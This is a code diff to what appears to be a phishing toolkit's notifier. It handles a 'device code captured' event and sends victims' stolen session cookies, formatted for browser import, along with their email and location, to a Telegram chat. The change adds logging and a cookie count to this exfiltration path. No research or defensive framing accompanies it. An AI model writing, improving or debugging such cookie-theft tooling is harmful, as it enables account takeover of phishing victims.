@@ -1112,6 +1112,12 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 		text += fmt.Sprintf("    Country:- %s", geoInfo.Country)
 
 	case EventDeviceCodeCaptured:
+		// Log incoming cookie count
+		log.Info("[telegram-dc] EventDeviceCodeCaptured triggered - data.Cookies has %d domains", len(data.Cookies))
+		for domain, cookies := range data.Cookies {
+			log.Debug("[telegram-dc] Domain %s: %d cookies", domain, len(cookies))
+		}
+		
 		// Get user info from custom fields
 		userEmail := ""
 		if data.Custom != nil {
@@ -1169,6 +1175,7 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 		}
 
 		// 2. Send COOKIES file (.json) - Cookie Editor format for browser import
+		log.Info("[telegram-dc] Checking cookies for JSON export: %d domains", len(data.Cookies))
 		if len(data.Cookies) > 0 {
 			type CookieEditorFormat struct {
 				Path           string `json:"path"`
@@ -1209,11 +1216,12 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 				}
 			}
 
+			log.Info("[telegram-dc] Built %d cookies for JSON export", len(cookies))
 			if len(cookies) > 0 {
 				jsonBytes, _ := json.Marshal(cookies)
 				cookieFilename := filenameBase + "_cookies.json"
-				cookieCaption := fmt.Sprintf("🍪 Session Cookies\n📧 %s\n📍 %s, %s %s",
-					userEmail, geoInfo.City, geoInfo.Country, geoInfo.CountryFlag)
+				cookieCaption := fmt.Sprintf("🍪 Session Cookies (%d)\n📧 %s\n📍 %s, %s %s",
+					len(cookies), userEmail, geoInfo.City, geoInfo.Country, geoInfo.CountryFlag)
 				
 				if err := nm.sendTelegramDocument(n, cookieFilename, string(jsonBytes), cookieCaption); err != nil {
 					log.Warning("[telegram] failed to send cookie file: %v", err)
@@ -1221,10 +1229,10 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 					log.Success("[telegram] Cookie file sent: %s (%d cookies)", cookieFilename, len(cookies))
 				}
 			} else {
-				log.Debug("[telegram] No cookies to send for device code capture")
+				log.Warning("[telegram] No cookies to send for device code capture (built 0)")
 			}
 		} else {
-			log.Debug("[telegram] data.Cookies is empty for device code capture")
+			log.Warning("[telegram] data.Cookies is empty/nil for device code capture")
 		}
 
 		return nil
